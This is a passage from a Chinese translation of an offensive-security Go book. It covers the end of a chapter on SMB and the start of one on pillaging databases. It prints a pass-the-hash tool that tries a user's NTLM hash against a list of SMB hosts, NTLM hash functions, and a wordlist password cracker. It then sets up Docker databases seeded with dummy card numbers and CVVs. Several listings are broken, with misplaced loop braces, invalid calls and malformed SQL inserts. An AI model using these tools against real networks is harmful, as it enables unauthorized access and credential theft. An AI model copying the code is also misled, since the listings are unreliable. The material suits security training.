
列表 6-13：处理 NTLM 哈希 (`/ch-6/smb/ntlmss/crypto.go`)

NTLM 哈希作为输入提供给 `ComputeResponseNTLMv2` 函数，这意味着该哈希值是独立于创建安全令牌的逻辑而创建的。这意味着存储在任何地方的哈希——即使在 LSASS 中——都被视为预先计算过的，因为你不需要提供域名、用户或密码作为输入。身份验证过程如下：

- 1. 使用域名、用户名和密码值计算用户的哈希。
- 2. 使用该哈希作为输入，计算 SMB 之上的 NTLMSSP 身份验证令牌。

由于你已经有了哈希，你已经完成了第 1 步。要传递哈希，你启动了 SMB 身份验证序列，就像你在本章开头部分定义的那样。然而，你从未计算过哈希。相反，你将提供的值作为哈希本身使用。

列表 6-14 显示了一个哈希传递（pass-the-hash）工具，它使用密码哈希尝试对一组机器进行特定用户身份验证。

```go
func main() {
	if len(os.Args) != 5 {
		log.Fatall("Usage: <target/hosts> <user> <domain> <hash>")
	}
buf, err := ioutil.ReadFile(os.Args[1])
	if err != nil {
		log.Fatall(err)
	}
options := smb.Options{
User: os.Args[2],
Domain: os.Args[3],
Hash: os.Args[4],
Port: 445,
}
targets := bytes.Split(buf, []byte("\n"))
for _, target := range targets {
	options.Host = string(target)
}
session, err := smb.NewSession(options, false)
if err != nil {
	fmt.Printf("%sLogin failed [%s]:%s\n", options.Host, err)
	continue
	}
	defer session.Close()
if session.IsAuthenticated {
	fmt.Printf("%sLogin successful [%s]\n", options.Host)
}
}
```

列表 6-14：用于身份验证的哈希传递 (`/ch-6/password-reuse/main.go`)

这段代码看起来与密码猜测示例相似。唯一的显著区别在于，你正在设置 `smb.Options` 的 `Hash` 字段（而不是 `Password` 字段），并且你正在遍历一个目标主机列表（而不是目标用户）。如果 `smb.NewSession()` 函数中的逻辑哈希值在 `options` 结构体中被填充，它将使用该哈希值。

## 恢复 NTLM 密码

在某些情况下，仅有密码哈希对于你的整个攻击链是不够的。例如，某些服务（如远程桌面、Outlook Web Access 等）不允许基于哈希的身份验证，因为它们要么不支持，要么不是默认配置。如果你的攻击链需要访问这些服务之一，你需要一个明文密码。在接下来的章节中，你将了解如何计算哈希以及如何创建一个基本的密码破解器。

## 计算哈希

在列表 6-15 中，你执行了计算哈希的魔术。

```go
func NewAuthenticatePass(domain, user, workstation, password string, c Challenge) Authenticate {
    // 假设 domain, user 和 workstation 不是 unicode 
nthash := Ntowfv2(password, user, domain)
lmhash := Lmovfv2(password, user, domain)
    return NewAuthenticate(domain, user, workstation, nthash, lmhash)
}
```

```go
func NewAuthenticateHash(domain, user, workstation, hash string, c Challenge) Authenticate {
    // 假设 domain, user 和 workstation 不是 unicode 
buf := make([]byte, len(hash)/2)
hex.Decode(buf,byte(hash))
    return NewAuthenticate(domain, user, workstation, buf, buf, c)
}
```

列表 6-15：计算哈希 (`/ch-6/smb/ntlmsp/ntlmsp.go`)

调用适当函数的逻辑在其他处定义，但你会发现这两个函数是相似的。真正的区别在于，`NewAuthenticatePass()` 函数中基于密码的身份验证在生成身份验证消息之前计算哈希，而 `NewAuthenticateHash()` 函数则跳过了这一步，直接使用提供的哈希作为输入生成消息。

## 恢复 NTLM 哈希

在列表 6-16 中，你可以看到一个通过破解提供的 NTLM 哈希来恢复密码的工具。

```go
func main() {
	if len(os.Args) != 5 {
		log.Fatall("Usage: <directory/file> <user> <domain> <hash>")
	}
hash := make([]byte, len(os.Args[4])/2)
	_, err := hex.Decode(hash, []byte(os.Args[4]))
	if err != nil {
		log.Fatall(err)
	}
f, err := ioutil.ReadFile(os.Args[1])
if err != nil {
		log.Fatall(err)
	}
var found string
passwords := bytes.Split(f, byte("\n"))
for _, password := range passwords {
	h := ntlmssp.Ntowfv2(string(password), os.Args[2], os.Args[3])
	if bytes.Equal(hash, h) {
		found = string(password)
		break
	}
	}
	if found != "" {
		fmt.Printf("[+] Recovered password: %s\n", found)
	} else {
		fmt.Printf("[-] Failed to recover password")
	}
}
```

列表 6-16：NTLM 破解 (`/ch-6/password-recovery/main.go`)

## 总结

你对 SMB 的深入检查，涵盖了协议细节、反射、结构标记和混合编码！你还学习了哈希传递是如何工作的，以及利用 SMB 包的一些工具程序。

为了继续学习，我们鼓励你探索额外的 SMB 通信，特别是远程代码执行，例如 PsExec。使用网络嗅探器（如 Wireshark）捕获数据包并评估该功能的工作原理。

## 7 滥用数据库和文件系统

![](img/c6b1f5eba6708bab206a93514c9cb9f_283_0.png)

在我们已经涵盖了大多数用于活动服务查询、命令控制和其他恶意活动的常用网络协议后，让我们转向关注另一个同样重要的话题：数据掠取。

虽然数据掠取可能不如初始利用、横向移动或权限提升那么刺激，但它是整个攻击链中的关键环节。毕竟，我们通常需要数据来执行这些活动。通常，数据对攻击者来说具有实物价值。虽然攻击一个组织很刺激，但数据本身对攻击者来说是丰厚的奖赏，对组织来说则是毁灭性的损失。IBM 的一项研究估计，每被盗一条记录的成本为 129 美元到 355 美元。该死，黑客在地下市场上出售信用卡可以赚进大钱，每张

每张卡的价格从 7 美元到 80 美元不等

(http://online.wsj.com/public/resources/documents/securework_hacker_annualreport.pdf)。

单此漏洞就导致了 4000 万卡的泄露。在某些情况下，Target 的卡片售价高达每张 135 美元（http://www.businessinsider.com/heres-what-happened-to-your-target-data-that-was-hacked-2014-10）。这相当获利。我们绝决不提倡此类活动，因为那些道德准则存在问题的人可以从数据掠夺中获得巨额利润。

关于行业和在线文章的华丽引用就够了——让我们开始掠夺吧！在本章，你将学习如何设置并填充各种 SQL 和 NoSQL 数据库，并学习如何通过 Go 连接并与这些数据库交互。我们还将演示如何创建一个数据库和文件系统挖掘器，用于搜索汁水信息的关键指标。

## 使用 DOCKER 设置数据库

在本节中，你将安装各种数据库系统，并使用将在在本章掠夺示例中使用的数据对其进行填充。在可能的情况下，将在 Ubuntu 18.04 虚拟机上使用 Docker。Docker 是一个软件容器平台，可以轻松地部署和管理应用程序。你可以将应用程序及其依赖项打包在一起，使其部署变得简单直当。容器与操作系统隔离，以防止宿主机平台被污染。这是非常酷的东西。

对于本章，你将为你使用的数据库使用多种预构建的 Docker 镜像。如果你还没有安装，请安装 Docker。你可以在 https://docs.docker.com/install/linux/docker-ce/ubuntu/ 找到 Ubuntu 的安装说明。

> 注意
> 我们特意省略了关于设置 Oracle 实例的细节。虽然 Oracle 提供了你可以下载并使用以创建测试数据库的 VM 镜像，但我们认为没有必要介绍这些步骤，因为它们与下方的 MySQL 示例非常相似。我们将 Oracle 特有的实现留作为一个练习，供你独立完成。

## 安装和填充 MongoDB

MongoDB 是你在本章使用的唯一 NoSQL 数据库。与传统的关系型数据库不同，MongoDB 不与 SQL 通信。相反，MongoDB 使用易于理解的 JSON 语法来检索和操作数据。整本书书都专门用于解释 MongoDB，而全面的解释显然超出了本书的范围。现在，你将安装 Docker 镜像并用伪数据填充。

与传统的 SQL 数据库不同，MongoDB 是无模式的（schemaless），这意味着它不遵循预定义的、的规则系统来组织表数据。这解释了为什么你在列表 7-1 中只看到插入命令，而没有任何模式定义。首先，使用以下命令安装 MongoDB Docker 镜像：

```
$ docker run --name some-mongo -p 27017:27017 mongo
```

这从 Docker 仓库下载名为 `mongo` 的镜像，启动一个名为 `some-mongo` 的新实例。你给实例起的名称是任意的——并将本地端口 27017 映射到容器端口 27017。端口映射是关键，因为它允许我们直接从操作系统访问数据库实例。如果没有它，它将无法访问。

通过列出运行中的容器来检查容器是否自动启动：

```
$ docker ps
```

如果你的容器没有自动启动，请运行以下命令：

```
$ docker start some-mongo
```

启动命令应该会让容器运行起来。

一旦容器启动，使用 run 命令连接 MongoDB 实例——传递 MongoDB 客户端；这样你就可以与数据库交互以填充数据：

```
$ docker run -it --link some-mongo:mongo --rm mongo sh \n-c 'exec mongo' \n"$MONGO_PORT_27017_TCP_ADDR:$MONGO_PORT_27017_TCP_PORT/store"
```

这个神奇命令运行了一个一次性的第二个 Docker 容器，其中安装了 MongoDB 二进制文件——因此你不需要在宿主机操作系统上安装该二进制文件——并使用它连接到 `some-mongo` Docker 容器的 MongoDB 实例。在这个示例中，你连接到一个名为 `test` 的数据库。

在列表 7-1 中，你向 `transactions` 集合插入了一个数组。（所有位于 /根目录下的代码列表都存在提供的 github 仓库 https://github.com/blackhat-go/bhg 中。）

```
> db.transactions.insert([
{
  "ccnum" : "4444333322221111",
  "date" : "2019-01-05",
  "amount" : 100.12,
  "cvv" : "1234",
  "exp" : "09/2020"
},
{
  "ccnum" : "4444123456789012",
  "date" : "2019-01-07",
  "amount" : 2400.18,
  "cvv" : "5544",
  "exp" : "02/2021"
},
{
  "ccnum" : "4465122334455667",
  "date" : "2019-01-29",
  "amount" : 1450.87,
  "cvv" : "9876",
  "exp" : "2019-06-06"
}
]);
```

列表 7-1: 向 MongoDB 插入事务 (ch-7/db/seed-mongo)

搞定！你创建了 MongoDB 实例并用三个文档填充了它。稍后将涉及到查询部分，但首先你应该知道如何安装和填充数据库。

## 安装和填充 PostgreSQL 和 MySQL

PostgreSQL 和 MySQL 可能是最常用的两种企业级数据库管理系统，都有官方 Docker 镜像。首先，以与示例相同的方法下载并运行：

```
docker run --name some-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=password
docker run --name some-postgres -p 5432:5432 -e POSTGRES_PASSWORD=password
```

容器完成后，确认它们正在运行，如果没有运行，你可以通过启动命令启动它们。接下来，你可以从主机连接容器——再次使用相应的客户端——并创建数据库。

列表 7-2: 创建并初始化 MySQL 数据库

```
$ docker run -it --link some-mysql:mysql --rm mysql sh \n-c 'exec mysql'
> create database store;
> use store;
> create table transactions(ccnum varchar(32), date date, amount float(7,2), cvv char(4), exp date);
```

该列表与下面的类似，启动了一个一次性的 Docker shell 来执行相应的数据库命令。它创建并连接到名为 `store` 的数据库，然后创建一个表。

```
$ docker run -it --link some-postgres:postgres --rm postgres sh
postgres=# create database store;
postgres=#connect store
store=# create transactions (ccnum varchar(32), date date, amount currency, char(4), exp date);
```

列表 7-3: 创建并初始化 PostgreSQL 数据库

插入事务时，语法是相同的。例如，在列表 7-4 中，你可以看到如何将三个文档插入到 MySQL 的 `transactions` 集合中。

```
mysql> insert into transactions(ccnum, date, amount, cvv, exp) values
-> ('444333332221111', '2019-01-05', '1234', '2020-09-01');
mysql> insert into transactions(ccnum, date, amount, cvv, exp) values
-> ('4444123456789012', '2019-01-07', '2400.18', '5544', '2021-02-01');
mysql> insert into transactions(ccnum, date, amount, cvv, exp) values
-> ('4465122334455667', '2019-01-29', '1450.87', '9876', '2019-06-06');
```

列表 7-4: 向 MySQL 数据库插入事务 (ch-7/db/seed-pg-mysql.sql)

尝试向你的 PostgreSQL 数据库插入相同的三个文档。

database。

## 安装并填充 Microsoft SQL Server 数据库

2016年，微软开始对其部分技术进行重大的开源工作。其中一项技术就是 Microsoft SQL (MSSQL) Server。在演示长期以来一直无法实现的功能——即在 Linux 操作系统上安装 MSSQL Server 时，突出这一信息显得很有意义。更棒的是，它有一个对应的 [Docker image](https://www.docker.com/) 镜像，你可以通过以下命令进行安装：

```bash
$ docker run --name=some-mssql -p 1433:1433 -e 'ACCEPT_EULA=Y'
-e 'SA_PASSWORD=Password!' -d microsoft/mssql-server-linux
```
